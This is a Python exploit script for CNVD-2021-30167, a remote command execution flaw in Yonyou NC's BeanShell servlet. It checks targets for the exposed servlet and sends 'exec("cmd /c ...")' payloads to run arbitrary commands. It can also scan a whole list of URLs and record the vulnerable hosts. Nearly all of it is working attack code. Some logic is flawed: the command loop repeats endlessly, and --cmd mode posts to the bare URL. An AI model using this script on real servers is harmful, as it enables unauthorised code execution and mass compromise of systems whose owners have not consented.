# -*- coding: utf-8 -*-
import argparse
import time

import requests
import re
import sys
from urllib.parse import quote
from pyfiglet import Figlet

RED = '\x1b[1;91m'
BLUE = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'

def check_host(host):
    if not host.startswith("http"):
        print(RED+'[x] ERROR: Host "{}" should start with http or https\n'.format(host)+ENDC)
        return False
    else:
        return True

def NcCheck(target_url):
    print(GREEN+"TARGET:"+target_url)
    print(BLUE + '[*]正在检测漏洞是否存在\n' + ENDC)
    url = target_url + '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        if response.status_code == 200 and 'BeanShell' in response.text:
            print(GREEN + '[+]BeanShell页面存在, 可能存在漏洞: {}\n'.format(url) + ENDC)
            return True
        else:
            print(RED + '[-]漏洞不存在\n' + ENDC)
    except:
        print(RED + '[-]无法与目标建立连接\n' + ENDC)


def NcRce(url,command):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    while True:
        data = 'bsh.script=' + quote('''exec("cmd /c {}")'''.format(command.replace('\\', '\\\\')), 'utf-8')
        try:
            response = requests.post(url=url, headers=headers, data=data)
            pattern = re.compile('<pre>(.*?)</pre>', re.S)
            result = re.search(pattern, response.text)
            print(result[0].replace('<pre>', '').replace('</pre>', ''))
        except:
            print(RED + '[-]未知错误\n' + ENDC)
            sys.exit(0)

def main():
    f = Figlet(width=2000)
    print(f.renderText("Cuerz"))

    parser = argparse.ArgumentParser(description='CNVD-2021-30167')
    print('Example: YONYOU-NC-RCE.py -u http://www.emample.com --check')

    parser.add_argument("-u", "--url", help='Start scanning url')
    parser.add_argument("-f", "--file", help='read the url from the file')
    parser.add_argument("--check", required=False, default=False, action='store_true', help='Check if vulnerable')
    parser.add_argument('--cmd', required=False, type=str, default=None, help='execute cmd (i.e: "ls -l")')
    args = parser.parse_args()

    if args.url and check_host(args.url):
        if args.check:
            NcCheck(args.url)
        elif args.cmd:
            NcRce(args.url,args.cmd)

    elif args.file:
        f = open(args.file,"r")
        all = f.readlines()
        for i in all:
            url = i.strip()
            if check_host(url):
                if NcCheck(url):
                    with open('Exist.txt', 'a+') as fp:
                        fp.write(url + '\n')
            time.sleep(0.2)



if __name__ == '__main__':
    main()
